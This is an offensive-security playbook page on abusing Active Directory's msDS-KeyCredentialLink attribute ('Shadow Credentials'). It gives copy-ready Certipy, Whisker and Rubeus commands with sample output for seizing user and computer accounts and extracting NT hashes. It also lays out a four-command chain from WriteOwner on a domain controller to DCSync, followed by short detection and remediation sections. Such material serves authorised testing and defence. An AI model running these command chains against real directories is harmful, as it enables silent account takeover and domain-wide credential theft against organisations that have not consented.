# Shadow Credentials - msDS-KeyCredentialLink Abuse

---

## What Are Shadow Credentials?

Every AD user and computer object has an attribute called **`msDS-KeyCredentialLink`**. It stores public keys used for **Windows Hello for Business** and other PKINIT-based passwordless auth. If you can write to that attribute on a target object, you can add **your own** public key - then request a Kerberos TGT for that account using the matching private key.

You never touch the password, you never trigger a password reset, and there's no NTLM downgrade. From the DC's perspective it just looks like a legitimate PKINIT logon.

**Why it matters:** turns *any write primitive* - `GenericWrite`, `GenericAll`, `WriteOwner`, `WriteDACL`, `AddKeyCredentialLink` - into a full account takeover. It's the modern replacement for targeted Kerberoasting (RBCD) and for password resets: quieter, works on computers as well as users, and doesn't require the target to be domain-joined or online.

**Kerberos requirement:** the DC must support PKINIT (Windows Server 2016+ functional level, and CA-issued domain controller cert installed - the usual case).

---

## When to Reach for This

You'll usually spot the opportunity in [BloodHound](../enumeration/bloodhound.md) as one of these edges:

| BloodHound edge | Shadow Credentials works? |
|---|---|
| `GenericAll` / `GenericWrite` on user or computer | Yes - direct write |
| `WriteOwner` | Yes - take ownership -> grant self write -> shadow creds |
| `WriteDACL` | Yes - add ACE granting self write -> shadow creds |
| `AddKeyCredentialLink` | Yes - the specific extended right |
| Ownership of a computer account you added | Yes - you own it, you write to it |

**Compared to alternatives on the same primitive:**

| Primitive | User target | Computer target | Detection |
|---|---|---|---|
| Password reset (`net user`) | Loud, disrupts user | N/A | User can't log in |
| Force change password (via NetExec) | Same | N/A | Same |
| **Shadow Credentials** | Silent, no password disruption | **Best option** | Only in DS Access auditing |
| RBCD (S4U2Self/Proxy) | No | Yes | Loud in Kerberos logs |
| Kerberoast via SPN write | Requires setspn + cracking | Requires setspn + cracking | Encrypted ticket in logs |

For **computer targets**, Shadow Credentials is strictly better than RBCD in almost every case - one cert operation vs a chained S4U dance.

---

## The Attack - Certipy (Linux)

Certipy handles the whole flow: it generates a keypair, writes the public key to `msDS-KeyCredentialLink`, and uses the private key to PKINIT the target.

```sh
# Write a shadow credential and immediately authenticate
certipy shadow auto \
  -u attacker@corp.local -p 'Password123!' \
  -dc-ip <DC-IP> \
  -account target-user

# Output:
# [*] Adding Key Credential with device ID '...' to the Key Credentials for 'target-user'
# [*] Successfully added Key Credential
# [*] Authenticating as 'target-user' with the certificate
# [*] Got hash for 'target-user@corp.local': aad3b4...:fc525c96...
# [*] Restoring the old Key Credentials for 'target-user'
```

**`shadow auto` cleans up after itself** - it restores the original `msDS-KeyCredentialLink` value so you don't leave your key behind.

### Sub-commands if you want manual control

```sh
# Add a shadow credential (no auth, no cleanup)
certipy shadow add -u attacker@corp.local -p pass -dc-ip <DC-IP> \
  -account target-user
# -> certificate.pfx + device-id

# List current key credentials
certipy shadow list -u attacker@corp.local -p pass -dc-ip <DC-IP> \
  -account target-user

# Remove a specific one by device ID
certipy shadow remove -u attacker@corp.local -p pass -dc-ip <DC-IP> \
  -account target-user -device-id <GUID>

# Clear ALL key credentials on the account
certipy shadow clear -u attacker@corp.local -p pass -dc-ip <DC-IP> \
  -account target-user
```

Then authenticate later:
```sh
certipy auth -pfx target-user.pfx -dc-ip <DC-IP>
```

---

## The Attack - Windows (Whisker + Rubeus)

Whisker writes the shadow credential; Rubeus uses the resulting cert to request a TGT.

```powershell
# 1. Add the shadow credential
Whisker.exe add /target:target-computer$
# Output: full Rubeus command line pre-baked with the cert as base64

# 2. Run the Rubeus command Whisker printed
Rubeus.exe asktgt /user:target-computer$ /certificate:<base64-pfx> \
  /password:<pfx-password> /domain:corp.local /dc:dc01.corp.local /getcredentials /show

# 3. Cleanup - restore original KeyCredentialLink
Whisker.exe clear /target:target-computer$
```

`/getcredentials` also runs UnPAC-the-hash so you get the NT hash out alongside the TGT.

---

## After the Cert - PKINIT to TGT to NT Hash

Whether Certipy or Rubeus, the end state is the same:

- **TGT** for the target - usable for pass-the-ticket
- **NT hash** for the target (via UnPAC) - usable for PTH, DCSync if the target is a DC computer account, RDP with `pth-rdp`, etc.

For a computer account target, that machine hash is exactly what you'd get from Mimikatz on the box - full authentication as `MACHINE$`, including local SYSTEM impersonation via S4U2Self.

---

## Full Chain Example: WriteOwner -> Domain Admin

You have `WriteOwner` on `DC01$` (spotted in BloodHound). Full chain:

```sh
# 1. Take ownership
owneredit.py -action write -new-owner attacker -target 'DC01$' \
  corp.local/attacker:pass

# 2. Grant yourself GenericAll (dacledit is impacket-toolkit)
dacledit.py -action write -rights FullControl \
  -principal attacker -target 'DC01$' \
  corp.local/attacker:pass

# 3. Shadow credential -> PKINIT -> machine hash
certipy shadow auto -u attacker@corp.local -p pass -dc-ip <DC-IP> \
  -account 'DC01$'

# 4. DCSync with the DC's machine hash
secretsdump.py -hashes :<DC01$-NT-hash> 'corp.local/DC01$@dc01.corp.local'
```

Same chain works on any computer with `GenericAll` - you don't have to hit a DC, but if you have DC computer rights, you're done in four commands.

---

## Detection

Rare in most environments because it requires **DS Access auditing** with `msDS-KeyCredentialLink` in the SACL. Signals to look for:

| Signal | Log | Notes |
|---|---|---|
| Directory service change to `msDS-KeyCredentialLink` | Event 5136 on DC | Requires DS Access SACL enabled |
| PKINIT logon without smart card enrollment | Event 4768 (TGT request) w/ pre-auth type 141 (PKINIT) | Baseline first - Windows Hello is legitimate |
| Cert-based auth from unexpected host | 4624 logon type 3 w/ auth package Kerberos | Correlate w/ device identity |

Detection typically fires *after* the account is compromised. Prevention is the actual defense.

---

## Remediation (For Report Writing)

- **Audit and remove unnecessary write ACLs** on user and computer objects - every `GenericWrite` grant is a potential shadow-creds path. BloodHound's `Users with Foreign Domain Group Membership` and similar queries surface the risky ones.
- **Enable DS Access auditing** with a SACL on `msDS-KeyCredentialLink` so writes are logged (Event 5136).
- **Alert on non-Windows-Hello writes** to `msDS-KeyCredentialLink` - legitimate writes come from `AzureAD` / Windows Hello enrollment flows and have predictable device attributes. Anything else is suspicious.
- **Restrict PKINIT** to a specific group if Windows Hello for Business isn't rolled out.
- **Reduce MachineAccountQuota** - attackers often chain shadow credentials with a self-added computer account. Set `ms-DS-MachineAccountQuota = 0` unless there's a business reason not to.

---

## Cheatsheet

```sh
# Auto (add + auth + cleanup)
certipy shadow auto -u user@corp.local -p pass -dc-ip <DC-IP> -account TARGET

# Manual add + later auth
certipy shadow add  -u user@corp.local -p pass -dc-ip <DC-IP> -account TARGET
certipy auth -pfx TARGET.pfx -dc-ip <DC-IP>

# Cleanup
certipy shadow clear -u user@corp.local -p pass -dc-ip <DC-IP> -account TARGET

# Windows
Whisker.exe add /target:TARGET$
Rubeus.exe asktgt /user:TARGET$ /certificate:<b64> /password:<pw> \
  /domain:corp.local /getcredentials /show
Whisker.exe clear /target:TARGET$
```

---

## Related

- [ADCS Attacks](adcs/README.md) - the CA side of certificate abuse (this note is the AD-object side)
- [ACL Abuse](acl-abuse.md) - the source of most write primitives that enable this
- [Delegation Attacks](delegation-attacks.md) - RBCD is the older technique this often replaces
- [BloodHound](../enumeration/bloodhound.md) - spot `AddKeyCredentialLink` / `GenericWrite` edges
